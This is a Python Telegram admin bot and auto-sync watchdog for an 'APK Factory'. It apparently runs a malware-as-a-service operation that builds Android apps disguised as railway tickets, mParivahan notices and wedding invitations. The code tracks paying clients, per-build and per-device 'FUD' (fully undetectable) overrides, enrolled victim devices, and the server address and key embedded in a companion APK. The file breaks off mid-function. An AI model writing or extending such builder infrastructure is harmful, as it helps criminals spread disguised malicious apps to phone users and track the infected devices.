#!/usr/bin/env python3
"""
vaultguard_bot.py
═══════════════════════════════════════════════════════════════════════════════
VaultGuard APK Factory — Telegram Admin Bot + 10-Layer Auto-Sync Watchdog
Runs as single Windows service: vaultguard_telegram

Contains:
  1. Telegram admin bot   — PIN + 2FAS auth, full menu UI, client management,
                            build trigger, live progress, paginated devices
  2. 10-Layer watchdog    — professional grade sync + self-healing

10-Layer Watchdog Architecture:
  Layer 1:  Single instance lock — no duplicate vaultguard_bot ever
  Layer 2:  PID tracking — clean kill/restart always works
  Layer 3:  Windows Scheduled Task registered on startup
  Layer 4:  Git credentials auto-configured from config.py
  Layer 5:  Relative paths — works on any RDP, any drive
  Layer 6:  Real-time sync — 30s polling
  Layer 7:  Timestamp preservation — file dates match GitHub exactly
  Layer 8:  File deletion sync — deleted on GitHub = deleted on RDP
  Layer 9:  Full reliability:
              exponential backoff retry, index.lock cleanup,
              corrupt repo auto re-clone, disk space check,
              SHA-256 file integrity verify, rate limit detection
  Layer 10: Health monitoring:
              sync status file, stale alert >10min,
              smart restart per FILE_SERVICE_MAP,
              24h encrypted Telegram backup

Requires:
  pip install pyTelegramBotAPI pyotp requests pycryptodome

Services:
  vaultguard_mutation   → update_server.py  (Flask API — separate process)
  vaultguard_cloudflare → cloudflared.exe   (tunnel — separate process)
  vaultguard_telegram   → vaultguard_bot.py       (this file — bot + watchdog combined)
═══════════════════════════════════════════════════════════════════════════════
"""

import base64
import hashlib
import json
import logging
import os
import re
import shutil
import sqlite3
import stat
import subprocess
import sys
import threading
import time
import urllib.request
from datetime import datetime, timezone

import pyotp
import requests
import telebot
from telebot import types

# ── Load config ───────────────────────────────────────────────────────────────
sys.path.insert(0, os.path.dirname(__file__))
import config

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 1 — CONSTANTS & PATHS
# ═══════════════════════════════════════════════════════════════════════════════

# ── Paths ─────────────────────────────────────────────────────────────────────
REPO_DIR        = config.REPO_DIR
TOOLS_DIR       = r"C:\VaultGuard\tools"
LOGS_DIR        = r"C:\VaultGuard\logs"
CLOUDFLARED_LOG = os.path.join(LOGS_DIR, "cloudflared.log")
BOT_LOG         = os.path.join(LOGS_DIR, "vaultguard_bot.log")
STRINGPOOL_PATH = config.STRINGPOOL_PATH
DB_PATH         = os.path.join(os.path.dirname(__file__), "bot.db")

# ── Watchdog intervals (Layer 6) ─────────────────────────────────────────────
GIT_PULL_INTERVAL     = 30   # seconds — real-time sync
URL_CHECK_INTERVAL    = 10   # seconds
HEALTH_CHECK_INTERVAL = 300  # seconds (5 min)
BACKUP_INTERVAL       = 86400  # seconds (24 hours)

# ── Reliability settings (Layer 9) ───────────────────────────────────────────
MAX_RETRIES   = 5    # git fetch retry attempts
RETRY_BASE    = 2    # exponential backoff base seconds
MIN_DISK_MB   = 200  # abort pull if disk < 200MB free
STALE_ALERT_S = 600  # alert if no sync for 10 minutes

# ── XOR key for StringPool encryption ────────────────────────────────────────
XOR_KEY = b"n0vAsEed"

# ── Lock file (Layer 1) ───────────────────────────────────────────────────────
LOCK_FILE   = r"C:\VaultGuard\vaultguard_bot.lock"
STATUS_FILE = os.path.join(LOGS_DIR, "sync_status.json")

# ── Files to delete if found on RDP (renamed/removed from repo) ──────────────
OBSOLETE_FILES = [
    os.path.join(REPO_DIR, "server", "mutation_server.py"),
    os.path.join(REPO_DIR, "server", "mutation_server"),
    os.path.join(REPO_DIR, "server", "update_server"),
    os.path.join(REPO_DIR, "server", "sync_watchdog.py"),
    os.path.join(REPO_DIR, "server", "telegram_bot.py"),
]

# ── Smart restart map (Layer 10) — which file change restarts which service ──
FILE_SERVICE_MAP = {
    "server/update_server.py":          "vaultguard_mutation",
    "scripts/package_name_generator.py": "vaultguard_mutation",
    "server/vaultguard_bot.py":               "vaultguard_telegram",
    "server/config.py":                 "vaultguard_telegram",
    "scripts/telegram_notify.py":       None,
    ".github/workflows/build.yml":      None,
}

# ── This file — self-restart vaultguard_telegram if changed ────────────────────────
SELF_FILE = os.path.join(REPO_DIR, "server", "vaultguard_bot.py")

# ── Services to health-check ──────────────────────────────────────────────────
REQUIRED_SERVICES = [
    "vaultguard_mutation",
    "vaultguard_cloudflare",
    "vaultguard_telegram",
]

# ── Watchdog state (thread-safe) ──────────────────────────────────────────────
_last_sync_ok   = 0
_last_sync_lock = threading.Lock()
_stale_alerted  = False
_file_hashes    = {}
_current_tunnel_url = ""

# ── Canonical templates (keep in sync with scripts/package_name_generator.py + build.yml) ──
# wedding | shaadi | shaadi_hindi | mparivahan | railway | friends | bhabhi | custom
TEMPLATES = {
    "railway":      ("🚂", "Indian Railway Ticket"),
    "mparivahan":   ("🚗", "mParivahan"),
    "wedding":      ("💍", "Wedding Invitation"),
    "shaadi":       ("💒", "Shaadi Ka Nimantran"),
    "shaadi_hindi": ("🙏", "शादी का निमंत्रण"),
    "friends":      ("👫", "Friends Club"),
    "bhabhi":       ("💃", "Fun with Bhabhi"),
    "custom":       ("⚙️",  "Custom"),
}

DEVICES_PER_PAGE = 20

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 2 — LOGGING
# ═══════════════════════════════════════════════════════════════════════════════

os.makedirs(LOGS_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(name)s] %(levelname)s %(message)s",
    handlers=[
        logging.FileHandler(BOT_LOG, encoding="utf-8"),
        logging.StreamHandler(open(os.devnull, 'w', encoding='utf-8')),
    ]
)
log     = logging.getLogger("vaultguard_bot")
log_w   = logging.getLogger("watchdog")

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 3 — BOT INIT
# ═══════════════════════════════════════════════════════════════════════════════

bot = telebot.TeleBot(config.BOT_TOKEN, parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 4 — DATABASE
# ═══════════════════════════════════════════════════════════════════════════════

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    db = get_db()
    db.executescript("""
        CREATE TABLE IF NOT EXISTS clients (
            id                INTEGER PRIMARY KEY AUTOINCREMENT,
            telegram_username TEXT NOT NULL,
            profile_name      TEXT,
            telegram_id       TEXT NOT NULL UNIQUE,
            rdp_ip            TEXT NOT NULL,
            token             TEXT NOT NULL UNIQUE,
            active            INTEGER DEFAULT 1,
            created_at        TEXT DEFAULT (datetime('now'))
        );

        CREATE TABLE IF NOT EXISTS builds (
            id              INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id       INTEGER NOT NULL REFERENCES clients(id),
            build_number    INTEGER,
            template        TEXT,
            package_name    TEXT,
            status          TEXT DEFAULT 'building',
            duration_secs   INTEGER DEFAULT 0,
            apk_size        TEXT DEFAULT '',
            started_at      TEXT DEFAULT (datetime('now')),
            finished_at     TEXT,
            github_run_id   TEXT DEFAULT '',
            chat_id         TEXT DEFAULT '',
            message_id      TEXT DEFAULT '',
            server_ip       TEXT DEFAULT '',
            server_port     TEXT DEFAULT '',
            server_key      TEXT DEFAULT ''
        );

        CREATE TABLE IF NOT EXISTS devices (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            build_id    INTEGER REFERENCES builds(id),
            client_id   INTEGER REFERENCES clients(id),
            device_id   TEXT NOT NULL,
            ip          TEXT,
            first_seen  TEXT DEFAULT (datetime('now')),
            last_seen   TEXT DEFAULT (datetime('now')),
            status      TEXT DEFAULT 'active'
        );
    """)
    db.commit()
    # ── Migrations: add columns to existing DBs ───────────────────────────────
    for col, definition in [
        ("server_ip",          "TEXT DEFAULT ''"),
        ("server_port",        "TEXT DEFAULT ''"),
        ("server_key",         "TEXT DEFAULT ''"),
        ("custom_app_name",    "TEXT DEFAULT ''"),
        ("custom_icon_fid",    "TEXT DEFAULT ''"),
        ("github_run_id",      "TEXT DEFAULT ''"),
        ("store_token",        "TEXT DEFAULT ''"),
    ]:
        try:
            db.execute(f"ALTER TABLE builds ADD COLUMN {col} {definition}")
            db.commit()
            log.info(f"Migration: added builds.{col}")
        except Exception:
            pass  # column already exists
    # ── Migration: clients table ──────────────────────────────────────────────
    try:
        db.execute("ALTER TABLE clients ADD COLUMN vpn_bypass INTEGER NOT NULL DEFAULT 1")
        db.commit()
        log.info("Migration: added clients.vpn_bypass")
    except Exception:
        pass  # column already exists

    for col, defn in [
        ("expire_ts",   "INTEGER DEFAULT 0"),
        ("killed",      "INTEGER DEFAULT 0"),
        ("grace_hours", "INTEGER DEFAULT 72"),
    ]:
        try:
            db.execute(f"ALTER TABLE clients ADD COLUMN {col} {defn}")
            db.commit()
            log.info(f"Migration: added clients.{col}")
        except Exception:
            pass  # column already exists

    # ── Migration: devices table — device detail fields ───────────────────────
    for col, defn in [
        ("model",           "TEXT DEFAULT ''"),
        ("manufacturer",    "TEXT DEFAULT ''"),
        ("android_version", "TEXT DEFAULT ''"),
        ("template",        "TEXT DEFAULT ''"),
        ("enrolled_at",     "TEXT DEFAULT ''"),
        ("fud_override",    "INTEGER DEFAULT -1"),
    ]:
        try:
            db.execute(f"ALTER TABLE devices ADD COLUMN {col} {defn}")
            db.commit()
            log.info(f"Migration: added devices.{col}")
        except Exception:
            pass  # column already exists

    # ── Migration: builds table — per-build FUD override ─────────────────────
    try:
        db.execute("ALTER TABLE builds ADD COLUMN fud_override INTEGER DEFAULT -1")
        db.commit()
        log.info("Migration: added builds.fud_override")
    except Exception:
        pass  # column already exists

    db.close()
    log.info("Database initialized")


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 5 — SHARED HELPERS (used by both bot and watchdog)
# ═══════════════════════════════════════════════════════════════════════════════

def utc_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

def resolve_fud(client_vpn_bypass: int,
                build_fud_override: int = -1,
                device_fud_override: int = -1) -> int:
    """
    3-level FUD resolution (most specific wins):
      Device override  (-1 = inherit) → Build override (-1 = inherit) → Client default
    Returns: 1 = FUD ON, 0 = FUD OFF
    """
    if device_fud_override != -1:
        return device_fud_override
    if build_fud_override != -1:
        return build_fud_override
    return int(client_vpn_bypass)


def format_secs(secs: int) -> str:
    if not secs:
        return "—"
    m = secs // 60
    s = secs % 60
    return f"{m}m {s:02d}s" if m > 0 else f"{s}s"


def time_ago(ts_str: str) -> str:
    if not ts_str:
        return "—"
    try:
        dt   = datetime.fromisoformat(ts_str.replace("Z", "+00:00"))
        diff = int(time.time()) - int(dt.timestamp())
        if diff < 3600:
            return f"{diff // 60}m ago"
        if diff < 86400:
            return f"{diff // 3600}h ago"
        return f"{diff // 86400}d ago"
    except Exception:
        return ts_str[:10]


def sha256_file(path: str) -> str:
    try:
        with open(path, "rb") as f:
            return hashlib.sha256(f.read()).hexdigest()
    except Exception:
        return ""


def xor_encrypt(plaintext: str) -> str:
    b = plaintext.encode("utf-8")
    return base64.b64encode(
        bytes([b[i] ^ XOR_KEY[i % len(XOR_KEY)] for i in range(len(b))])
    ).decode("ascii")


# ── Companion APK server-config reader ───────────────────────────────────────
_COMPANION_APK = os.path.join(REPO_DIR, "app", "src", "main", "assets", "companion.apk")

def read_companion_server_config() -> dict:
    """Read current IP, port, key from companion.apk assets DEX.

    Scans classes.dex for Base64 strings that decode to an IPv4 address,
    a numeric port, and the key (looked up by known default or by proximity).
    Returns dict with keys: ip, port, key, ip_b64, port_b64, key_b64.
    All values are empty string if not found or APK not accessible.
    """
    import zipfile, re as _re

    result = {"ip": "", "port": "", "key": "",
              "ip_b64": "", "port_b64": "", "key_b64": ""}
    try:
        if not os.path.isfile(_COMPANION_APK):
            return result
        with zipfile.ZipFile(_COMPANION_APK, "r") as z:
            if "classes.dex" not in z.namelist():
                return result
            dex = z.read("classes.dex")

        b64_pat = _re.compile(rb'[A-Za-z0-9+/]{6,}={0,2}')

        found_ip   = ""
        found_port = ""
        found_key  = ""
        found_ip_b64   = ""
        found_port_b64 = ""
        found_key_b64  = ""

        for m in b64_pat.finditer(dex):
            raw = m.group()
            try:
                dec = base64.b64decode(raw + b"==").decode("ascii")
            except Exception:
                continue
            # IPv4 or domain name
            if not found_ip and (
                _re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', dec) or
                _re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', dec)
            ):
                found_ip     = dec
                found_ip_b64 = raw.decode()
            # Port (numeric 1024–65535)
            elif not found_port and _re.match(r'^\d{3,5}$', dec) and 1024 <= int(dec) <= 65535:
                found_port     = dec
                found_port_b64 = raw.decode()

        # Key: scan entire DEX (key can be far from IP — 35KB apart in practice).
        # Criteria: b64 decodes to mixed-case alphanumeric (has BOTH upper & lower),
        # length 3–32, not all-digits, not IPv4, not all-uppercase Android constant.
        # Among all candidates, pick the one closest to IP position.
        ip_pos_abs = dex.find(found_ip_b64.encode()) if found_ip_b64 else len(dex) // 2
        best_key_dist = None
        for m in b64_pat.finditer(dex):
            raw = m.group()
            # Only pure-alphanumeric base64 tokens (no + or /)
            if not _re.match(rb'^[A-Za-z0-9]+=*$', raw):
                continue
            try:
                dec = base64.b64decode(raw + b"==").decode("ascii")
            except Exception:
                continue
            if not (3 <= len(dec) <= 32):
                continue
            # Decoded value must be fully alphanumeric
            if not _re.match(r'^[A-Za-z0-9]+$', dec):
                continue
            if dec.isdigit():
                continue
            if _re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', dec):
                continue
            # Skip all-uppercase Android constants (e.g. VIEW_ID, SCROLL)
            if _re.match(r'^[A-Z0-9]{3,}$', dec):
                continue
            # Key must be mixed-case: has both uppercase and lowercase letters.
            # This is the strongest discriminator — real keys like TxTxT have both.
            has_upper = any(c.isupper() for c in dec)
            has_lower = any(c.islower() for c in dec)
            if not (has_upper and has_lower):
                continue
            # Skip strings that look like Java class/method names (StartNewScan etc.)
            # by requiring at least one digit or non-word char pattern,
            # OR length ≤ 10 (short keys). Longer readable words are likely code names.
            if len(dec) > 10 and dec.isalpha():
                continue
            # Pick candidate closest to IP position in the DEX
            dist = abs(m.start() - ip_pos_abs)
            if best_key_dist is None or dist < best_key_dist:
                found_key      = dec
                found_key_b64  = raw.decode()
                best_key_dist  = dist

        result.update({
            "ip":       found_ip,
            "port":     found_port,
            "key":      found_key,
            "ip_b64":   found_ip_b64,
            "port_b64": found_port_b64,
            "key_b64":  found_key_b64,
        })
    except Exception:
        pass
    return result


# ── Git binary auto-detection (Layer 2) ──────────────────────────────────────
_git_exe   = None  # cached git binary path
_sync_lock = threading.Lock()  # Layer 3: mutex — no concurrent pulls

# ── Git environment (Layer 8) ─────────────────────────────────────────────────
_GIT_ENV = {
    **os.environ,
    "GIT_TERMINAL_PROMPT": "0",      # never hang on auth prompt
    "GIT_ASKPASS":         "echo",   # auto-answer prompts
    "PYTHONIOENCODING":    "utf-8",  # force UTF-8
    "LC_ALL":              "C.UTF-8",
}


def _find_git() -> str:
    """
    Layer 2: Auto-detect git binary.
    Searches PATH + common Windows install locations.
    Caches result — only searches once.
    """
    global _git_exe
    if _git_exe:
        return _git_exe

    # Search PATH first
    for candidate in ["git", "git.exe"]:
        try:
            r = subprocess.run(
                f"where {candidate}",
                shell=True, capture_output=True,
                text=True, timeout=5
            )
            if r.returncode == 0 and r.stdout.strip():
                _git_exe = r.stdout.strip().splitlines()[0].strip()
                log_w.info(f"Git found in PATH: {_git_exe}")
                return _git_exe
        except Exception:
            pass

    # Search common install locations
    candidates = [
        r"C:\Program Files\Git\bin\git.exe",
        r"C:\Program Files (x86)\Git\bin\git.exe",
        r"C:\VaultGuard\tools\git\bin\git.exe",
        r"C:\tools\git\bin\git.exe",
        r"C:\Git\bin\git.exe",
    ]
    for path in candidates:
        if os.path.exists(path):
            _git_exe = path
            # Add to PATH for this session
            git_bin = os.path.dirname(path)
            os.environ["PATH"] = git_bin + ";" + os.environ.get("PATH", "")
            _GIT_ENV["PATH"]   = git_bin + ";" + _GIT_ENV.get("PATH", "")
            log_w.info(f"Git found at: {path}")
            return _git_exe

    log_w.error("Git binary not found — sync will fail")
    return "git"  # fallback — may fail but won't crash


def _kill_process_tree(pid: int):
    """
    Layer 9: Force-kill hung git process + all children.
    Prevents zombie processes blocking future sync.
    """
    try:
        subprocess.run(
            f"taskkill /F /T /PID {pid}",
            shell=True, capture_output=True, timeout=5
        )
    except Exception:
        pass


def run_git(cmd: str, timeout: int = 60,
            retries: int = 1) -> tuple:
    """
    Layer 1+2+8+9: Permanent robust git runner.

    Features:
    - Auto-finds git binary (Layer 2)
    - UTF-8 encoding forced (Layer 8)
    - errors="replace" — no crash on bad chars
    - Force-kills hung processes (Layer 9)
    - Retry on transient errors
    - Always returns (rc, stdout, stderr)
    - Never raises — always safe
    """
    git = _find_git()

    # Replace 'git' prefix in cmd with full path
    if cmd.startswith("git "):
        full_cmd = f'"{git}" {cmd[4:]}'
    else:
        full_cmd = cmd

    last_rc, last_out, last_err = 1, "", ""

    for attempt in range(max(1, retries)):
        proc = None
        try:
            proc = subprocess.Popen(
                full_cmd,
                shell=True,
                cwd=REPO_DIR,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                env=_GIT_ENV,
            )
            try:
                stdout, stderr = proc.communicate(timeout=timeout)
                last_rc  = proc.returncode
                last_out = stdout.decode(
                    "utf-8", errors="replace").strip()
                last_err = stderr.decode(
                    "utf-8", errors="replace").strip()

                # Success
                if last_rc == 0:
                    return last_rc, last_out, last_err

                # Transient errors — retry
                transient = [
                    "index.lock",
                    "cannot lock ref",
                    "unable to access",
                    "could not resolve host",
                    "connection timed out",
                    "the remote end hung up",
                ]
                is_transient = any(
                    t in last_err.lower() for t in transient)
                if is_transient and attempt < retries - 1:
                    # Clean lock if needed
                    if "index.lock" in last_err:
                        cleanup_git_lock()
                    wait = 2 ** attempt
                    log_w.warning(
                        f"Transient git error (attempt "
                        f"{attempt + 1}/{retries}) — "
                        f"retry in {wait}s: {last_err[:60]}"
                    )
                    time.sleep(wait)
                    continue

            except subprocess.TimeoutExpired:
                # Layer 9: Force kill hung process
                log_w.warning(
                    f"Git command timed out after {timeout}s — "
                    f"killing: {cmd[:60]}"
                )
                _kill_process_tree(proc.pid)
                last_rc  = -1
                last_err = f"TIMEOUT after {timeout}s"

        except FileNotFoundError:
            last_rc  = -1
            last_err = f"Git binary not found: {git}"
            log_w.error(last_err)
            break
        except Exception as e:
            last_rc  = -1
            last_err = str(e)
            log_w.error(f"run_git exception: {e}")
            break

    return last_rc, last_out, last_err


def run_cmd(cmd: str, timeout: int = 30) -> tuple:
    """
    Permanent robust command runner.
    UTF-8 safe, always returns (rc, stdout, stderr), never raises.
    """
    try:
        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=_GIT_ENV,
        )
        try:
            stdout, stderr = proc.communicate(timeout=timeout)
            return (
                proc.returncode,
                stdout.decode("utf-8", errors="replace").strip(),
                stderr.decode("utf-8", errors="replace").strip(),
            )
        except subprocess.TimeoutExpired:
            _kill_process_tree(proc.pid)
            return -1, "", f"TIMEOUT after {timeout}s"
    except Exception as e:
        return -1, "", str(e)


def get_service_status(service_name: str) -> str:
    rc, out, err = run_cmd(f"nssm status {service_name}")
    return out.strip()


def start_service(service_name: str) -> bool:
    rc, out, err = run_cmd(f"nssm start {service_name}")
    return rc == 0


def restart_service(service_name: str) -> bool:
    try:
        # CRITICAL: never use "nssm stop vaultguard_telegram" from inside vaultguard_telegram
        # — nssm stop sends ^C (KeyboardInterrupt) to the calling process, killing
        # the bot before nssm start can run.
        # Fix: use "sc" (Windows Service Control) which does NOT signal the caller,
        # and run in a fully detached subprocess so no signal can propagate back.
        DETACHED = 0x00000008  # DETACHED_PROCESS flag — no signal inheritance
        CREATE_NEW_PG = 0x00000200  # new process group — isolates Ctrl+C

        def _sc(cmd: str, timeout: int = 15):
            return subprocess.run(
                f"sc {cmd} {service_name}",
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                creationflags=DETACHED | CREATE_NEW_PG,
            )

        _sc("stop", timeout=15)
        time.sleep(3)
        _sc("start", timeout=15)
        time.sleep(3)
        # Verify
        status = subprocess.run(
            f"sc query {service_name}", shell=True,
            capture_output=True, text=True, timeout=10,
        )
        if "RUNNING" in status.stdout:
            log_w.info(f"Service restarted and running: {service_name}")
            return True
        # Retry once
        _sc("start", timeout=15)
        log_w.warning(f"Service restart retry: {service_name}")
        return True
    except Exception as e:
        log_w.error(f"Service restart error: {service_name} — {e}")
        return False


def check_service_running(name: str) -> bool:
    return "SERVICE_RUNNING" in get_service_status(name)


def send_telegram_alert(msg: str) -> int | None:
    """Send plain Telegram alert — used by watchdog (no bot instance needed).
    Returns the message_id on success, None on failure."""
    try:
        url  = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage"
        data = json.dumps({
            "chat_id":    config.MASTER_CHAT_ID,
            "text":       msg,
            "parse_mode": "HTML"
        }).encode()
        req = urllib.request.Request(
            url, data=data,
            headers={"Content-Type": "application/json"}
        )
        resp = urllib.request.urlopen(req, timeout=10)
        result = json.loads(resp.read().decode())
        return result.get("result", {}).get("message_id")
    except Exception as e:
        log_w.error(f"Telegram alert error: {e}")
        return None


def _delete_telegram_message_after(delay_seconds: int, message_id: int):
    """Background thread: delete a Telegram message after a delay."""
    import threading
    def _do_delete():
        time.sleep(delay_seconds)
        try:
            url  = f"https://api.telegram.org/bot{config.BOT_TOKEN}/deleteMessage"
            data = json.dumps({
                "chat_id":    config.MASTER_CHAT_ID,
                "message_id": message_id
            }).encode()
            req = urllib.request.Request(
                url, data=data,
                headers={"Content-Type": "application/json"}
            )
            urllib.request.urlopen(req, timeout=10)
        except Exception as e:
            log_w.error(f"Auto-delete message error: {e}")
    t = threading.Thread(target=_do_delete, daemon=True)
    t.start()


def generate_client_token(username: str) -> str:
    import secrets
    return hashlib.sha256(
        f"{username}{secrets.token_hex(8)}".encode()
    ).hexdigest()[:16]


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 6 — AUTH (7-Layer Session System)
#
# Layer 1: Memory dict          — fastest, primary lookup
# Layer 2: AES-256-GCM JSON file — survives restarts, encrypted at rest
# Layer 3: Wrong PIN lockout    — 30 min lockout after 3 fails
# Layer 4: Suspicious activity  — session kill on brute force during session
# Layer 5: AES-256-GCM file     — session file encrypted (not plain JSON)
# Layer 6: Auto cleanup thread  — expired sessions purged every 30 min
# Layer 7: Single active session — new login invalidates previous
# ═══════════════════════════════════════════════════════════════════════════════

# ── State dicts ───────────────────────────────────────────────────────────────
_verified        = {}   # Layer 1: { chat_id_str: expiry_timestamp }
_lockout_until   = {}   # Layer 3: { chat_id_str: lockout_timestamp }
_failed_pins     = {}   # Layer 3: { chat_id_str: fail_count }
_failed_totp     = {}   # Layer 3: { chat_id_str: fail_count }
_unlock_attempts = {}   # Emergency unlock: { chat_id_str: fail_count }
_unlock_blocked  = set()  # chat_ids permanently ignored until restart (3 wrong master passwords)

pin_buffer       = {}   # { chat_id: "1234" }
nav_state        = {}   # { chat_id: { "screen": ..., "message_id": ... } }
add_client_buf   = {}   # { chat_id: { "field": ..., "data": {} } }
edit_client_buf  = {}   # { chat_id: { "field": str, "client_id": int } }
custom_build_buf  = {}   # { chat_id: { "step": "name"|"icon", "client_id": int, "app_name": str, "icon_file_id": str } }
server_config_buf = {}   # { chat_id: { "step": "host_type"|"ip"|"domain"|"port"|"key", "host_type": "ip"|"domain"|None, "client_id": int, "template": str, "ip": str, "port": str, "key": str } }
dev_test_config_buf = {}  # { chat_id: { "step": "ip"|"port"|"key"|"done", "build_type": str, "ip": str, "port": str, "key": str } }
# Transient notification message IDs — deleted automatically on /start
_pending_delete_msg_ids: list[int] = []  # message IDs to delete when admin taps /start

# ── Session file (Layer 2 + 5) ────────────────────────────────────────────────
SESSION_FILE     = os.path.join(
    os.path.dirname(__file__), ".admin_session.enc")
SESSION_HOURS    = config.SESSION_TIMEOUT_HRS
LOCKOUT_MINUTES  = 30
MAX_PIN_FAILS    = 3
MAX_TOTP_FAILS   = 3
MAX_UNLOCK_FAILS = 3

# ── Session file encryption (Layer 5) ────────────────────────────────────────

# Cache the session key at startup — derived once from real config values.
# git reset --hard temporarily replaces config.py with placeholders; if
# _session_enc_key() re-read config on every call, the key would change
# mid-flight during sync, AES-GCM decrypt would fail, and the session
# file would be deleted → PIN prompt every 30 s.
_SESSION_KEY: bytes = b""

def _session_enc_key() -> bytes:
    """Return the cached session encryption key (derived at startup)."""
    return _SESSION_KEY

def _init_session_key() -> None:
    """Call once at startup after config is confirmed real."""
    global _SESSION_KEY
    raw = (str(getattr(config, "TOTP_SECRET", "vaultguard"))
           + str(getattr(config, "ADMIN_PIN", "0000")))
    _SESSION_KEY = hashlib.sha256(raw.encode()).digest()


def _save_session_file():
    """Layer 2 + 5: Write encrypted session file."""
    try:
        from Crypto.Cipher import AES
        from Crypto.Random import get_random_bytes
        data    = json.dumps(_verified).encode()
        key     = _session_enc_key()
        iv      = get_random_bytes(12)
        cipher  = AES.new(key, AES.MODE_GCM, nonce=iv)
        ct, tag = cipher.encrypt_and_digest(data)
        with open(SESSION_FILE, "wb") as f:
            f.write(iv + tag + ct)
    except Exception as e:
        log.warning(f"Session file save error: {e}")


def _load_session_file():
    """Layer 2 + 5: Read + decrypt session file → restore to memory."""
    global _verified
    if not os.path.exists(SESSION_FILE):
        return
    try:
        from Crypto.Cipher import AES
        with open(SESSION_FILE, "rb") as f:
            raw = f.read()
        key    = _session_enc_key()
        iv     = raw[:12]
        tag    = raw[12:28]
        ct     = raw[28:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        data   = cipher.decrypt_and_verify(ct, tag)
        loaded = json.loads(data.decode())
        now    = time.time()
        # Only restore sessions that are still valid
        _verified = {
            cid: exp for cid, exp in loaded.items()
            if exp > now
        }
        if _verified:
            log.info(
                f"Session restored from file — "
                f"{len(_verified)} active session(s) ✅"
            )
    except Exception as e:
        # Never delete the session file on decrypt error — the key may be
        # temporarily wrong (e.g. during git reset --hard before config restore).
        # Just skip; the cached _SESSION_KEY prevents this in normal operation.
        log.warning(f"Session file load error (not deleting): {e}")


# ── Layer 1 + 2: Core session functions ──────────────────────────────────────

def is_admin(chat_id: int) -> bool:
    return str(chat_id) == str(config.MASTER_CHAT_ID)


def create_session(chat_id: int):
    """Layer 1 + 2 + 7: Create session — single active session enforced."""
    cid    = str(chat_id)
    expiry = time.time() + SESSION_HOURS * 3600

    # Layer 7: Invalidate any previous session first
    _verified.pop(cid, None)

    # Layer 1: Write to memory
    _verified[cid] = expiry

    # Layer 2 + 5: Write to encrypted file
    _save_session_file()

    # Clear any lockout on successful login
    _lockout_until.pop(cid, None)
    _failed_pins.pop(cid, None)
    _failed_totp.pop(cid, None)

    log.info(
        f"Session created for {chat_id} — "
        f"expires in {SESSION_HOURS}h ✅"
    )


def session_valid(chat_id: int) -> bool:
    """
    Layer 1 + 2: Check session validity.
    Memory first → file fallback → restore to memory.
    """
    cid = str(chat_id)
    now = time.time()

    # Layer 1: Check memory
    exp = _verified.get(cid, 0)
    if exp and now < exp:
        return True

    # Layer 2: Check file (bot was restarted)
    try:
        if os.path.exists(SESSION_FILE):
            from Crypto.Cipher import AES
            with open(SESSION_FILE, "rb") as f:
                raw = f.read()
            key    = _session_enc_key()
            iv     = raw[:12]
            tag    = raw[12:28]
            ct     = raw[28:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
            data   = cipher.decrypt_and_verify(ct, tag)
            loaded = json.loads(data.decode())
            exp    = loaded.get(cid, 0)
            if exp and now < exp:
                # Layer 1: Restore to memory
                _verified[cid] = exp
                log.info(
                    f"Session restored from file "
                    f"for {chat_id} ✅"
                )
                return True
    except Exception:
        pass

    # Expired — clean up
    _verified.pop(cid, None)
    return False


def invalidate_session(chat_id: int):
    """Layer 4 + 7: Invalidate session immediately."""
    cid = str(chat_id)
    _verified.pop(cid, None)
    _save_session_file()
    log.info(f"Session invalidated for {chat_id}")


def session_remaining(chat_id: int) -> str:
    cid = str(chat_id)
    exp = _verified.get(cid, 0)
    if not exp:
        # Try file
        try:
            if os.path.exists(SESSION_FILE):
                from Crypto.Cipher import AES
                with open(SESSION_FILE, "rb") as f:
                    raw = f.read()
                key    = _session_enc_key()
                iv, tag, ct = raw[:12], raw[12:28], raw[28:]
                cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                data   = cipher.decrypt_and_verify(ct, tag)
                exp    = json.loads(data.decode()).get(cid, 0)
        except Exception:
            pass
    if exp:
        rem = exp - time.time()
        if rem > 0:
            h = int(rem // 3600)
            m = int((rem % 3600) // 60)
            return f"{h}h {m}m" if h > 0 else f"{m}m"
    return "0m"


# ── Layer 3: Lockout system ───────────────────────────────────────────────────

def is_locked_out(chat_id: int) -> tuple:
    """Returns (locked: bool, minutes_remaining: int)."""
    cid   = str(chat_id)
    until = _lockout_until.get(cid, 0)
    if time.time() < until:
        mins = int((until - time.time()) / 60) + 1
        return True, mins
    return False, 0


def record_pin_fail(chat_id: int) -> int:
    """Record failed PIN attempt. Returns fail count."""
    cid              = str(chat_id)
    _failed_pins[cid] = _failed_pins.get(cid, 0) + 1
    count            = _failed_pins[cid]

    # Layer 3: Lock after MAX_PIN_FAILS
    if count >= MAX_PIN_FAILS:
        _lockout_until[cid] = time.time() + LOCKOUT_MINUTES * 60
        _failed_pins[cid]   = 0
        log.warning(
            f"PIN lockout triggered for {chat_id} "
            f"— {LOCKOUT_MINUTES} min"
        )
        send_telegram_alert(
            f"🔐 <b>PIN Lockout</b>\n"
            f"Admin bot: {MAX_PIN_FAILS} wrong PIN attempts.\n"
            f"Locked for {LOCKOUT_MINUTES} minutes."
        )

    # Layer 4: If valid session exists — kill it (suspicious)
    if str(chat_id) in _verified:
